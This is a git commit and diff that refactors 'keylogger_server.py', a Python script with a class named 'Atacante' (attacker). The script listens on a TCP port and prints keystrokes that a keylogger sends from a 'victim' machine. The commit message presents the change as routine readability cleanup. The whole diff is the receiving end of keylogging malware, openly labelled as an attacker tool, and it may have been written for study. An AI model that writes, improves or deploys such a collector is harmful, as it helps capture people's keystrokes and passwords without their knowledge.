2d2c7cadd032c8fe0f260c1b4d8fc96548dc9206
Jordi Serrano <44474715+j0rd1s3rr4n0@users.noreply.github.com>
2023-12-06 23:53:37 +0100

    Update keylogger_server.py
    This commit updates the 'atacante.py' script to improve code readability and adhere to Python naming conventions. The class name 'atacante' has been changed to 'Atacante' to follow CamelCase naming. Descriptive comments have been added to enhance code understanding. The script now includes a main function, making it more modular and allowing easier reuse of the 'Atacante' class. The if __name__ == "__main__": block has been added to ensure that the script is executed only when run as the main module. Overall, these changes contribute to better code organization and maintainability.

--- keylogger_server.py
+++ keylogger_server.py
@@ -1,19 +1,34 @@
 import socket
 
-class atacante(object):
-	def __init__(self): 
-		self.server=socket.socket(socket.AF_INET, socket.SOCK_STREAM) #socket.AF_INET --> IPv4; socket.SOCKET_STREAM --> Protocolo TCP
-		self.host="192.168.1.150" #Definimos el servidor y la IP
-		self.port=4040 #Definimos el puerto
+class Atacante:
+    def __init__(self):
+        # Crear un socket para IPv4 y protocolo TCP
+        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.host = "192.168.1.150"  # Definir la dirección del servidor
+        self.port = 4040  # Definir el puerto de escucha
 
-	def main(self):
-		self.server.bind((self.host, self.port)) #Abrir conexion - Abrir servidor
-		self.server.listen(1) #Establecer cuantos equipos se pueden conectar aqui
-		print "[INFO] Esperant keylogger-"
-		while True:
-			victima, direccion=self.server.accept() #Aceptamos peticion
-			print "[INFO] keylogger connectat amb {0}".format(direccion[0])
-			
-			while True:
+    def main(self):
+        # Vincular el socket al servidor y puerto
+        self.server.bind((self.host, self.port))
+        # Establecer el límite de conexiones simultáneas
+        self.server.listen(1)
+        print("[INFO] Esperando conexión del keylogger...")
 
-				print(victima.recv(2))
+        while True:
+            # Aceptar la conexión entrante
+            victim, address = self.server.accept()
+            print("[INFO] Keylogger conectado con {0}".format(address[0]))
+
+            while True:
+                # Recibir datos del keylogger (se asume que cada paquete tiene 2 bytes)
+                data = victim.recv(2)
+                print(data)
+
+def main():
+    # Crear una instancia de la clase Atacante y ejecutar el método main
+    attacker = Atacante()
+    attacker.main()
+
+if __name__ == "__main__":
+    # Ejecutar la función main solo cuando el script es ejecutado directamente
+    main()
